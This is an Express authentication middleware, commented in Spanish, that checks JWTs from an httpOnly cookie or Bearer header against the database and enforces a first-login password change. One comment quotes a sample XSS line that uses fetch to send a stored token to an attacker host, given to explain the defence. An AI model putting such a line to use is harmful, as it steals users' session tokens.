import jwt from 'jsonwebtoken';
import { env } from '../config/env.js';
import { pool } from '../config/database.js';
import { COOKIE_NAME } from '../utils/sessionCookie.js';

// El navegador (web) manda el token en una cookie httpOnly: JavaScript nunca puede leerla, así que
// un XSS ya no puede robarla con algo tan simple como `fetch(atacante, {body: localStorage.token})`
// como pasaba antes. El encabezado Authorization se mantiene para scripts, pruebas automáticas y
// cualquier cliente que no sea el navegador (no lo usa la web en producción).
//
// El token dura 8 h y lleva el rol adentro, pero no basta con su firma: en cada petición se
// confirma contra la base de datos que la cuenta siga existiendo y activa, y se usa su rol ACTUAL.
// Así, desactivar, eliminar o quitarle el rol a alguien le corta el acceso de inmediato, sin
// esperar a que su sesión expire.
export async function auth(req,res,next){
  const header=req.headers.authorization;
  const token = header?.startsWith('Bearer ') ? header.slice(7) : req.cookies?.[COOKIE_NAME];
  if(!token) return res.status(401).json({error:'Token requerido'});
  let payload;
  try {
    payload=jwt.verify(token, env.jwtSecret, { algorithms: ['HS256'] });
  } catch { return res.status(401).json({error:'Token inválido'}); }

  const r=await pool.query('SELECT id,email,rol,debe_cambiar_password FROM usuarios WHERE id=$1 AND activo=true',[payload.id]);
  if(!r.rowCount) return res.status(401).json({error:'Sesión inválida'});
  req.user={...payload, email:r.rows[0].email, rol:r.rows[0].rol, debeCambiarPassword:r.rows[0].debe_cambiar_password};

  // Cambio de clave obligatorio al primer ingreso: mientras la cuenta esté marcada, se bloquea
  // TODO endpoint protegido salvo los imprescindibles para cambiarla (su propio perfil y el cambio
  // en sí). Al ir en el middleware de auth —antes de cualquier control de rol— no se puede evitar
  // llamando la API directo; la web no puede "saltárselo". /logout no pasa por aquí (no lleva auth).
  if(req.user.debeCambiarPassword && !RUTAS_PERMITIDAS.has(`${req.baseUrl}${req.path}`))
    return res.status(403).json({error:'Debes cambiar tu contraseña antes de continuar',code:'PASSWORD_CHANGE_REQUIRED'});

  next();
}

const RUTAS_PERMITIDAS = new Set(['/api/auth/me','/api/auth/change-password']);
